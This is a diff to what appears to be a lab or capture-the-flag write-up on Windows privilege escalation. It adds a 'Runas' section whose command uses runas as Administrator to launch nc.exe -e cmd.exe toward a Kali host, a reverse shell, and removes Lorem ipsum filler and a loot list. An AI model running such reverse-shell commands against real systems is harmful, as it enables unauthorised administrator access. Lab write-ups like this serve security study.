@@ -325,17 +325,20 @@ Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor
 ![](Pasted%20image%2020221009202519.png)
 
 ![](Pasted%20image%2020221009202604.png)
-
-
 #RunProgramFromDifferentWindowsUser #RunasPrivilegeEscalation
 
 
 ## Privilege Escalation vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+## Runas command to login with a different user in CMD
+
+#### - Typed runas /user:Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443" (can also type runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443") and received a cmd promp running as Administrator:
+
+![](Pasted%20image%2020221009202519.png)
+
+![](Pasted%20image%2020221009202604.png)
+
+
+#RunProgramFromDifferentWindowsUser #RunasPrivilegeEscalation
 
 ---
 
-# Trophy & Loot
-user.txt
-
-root.txt
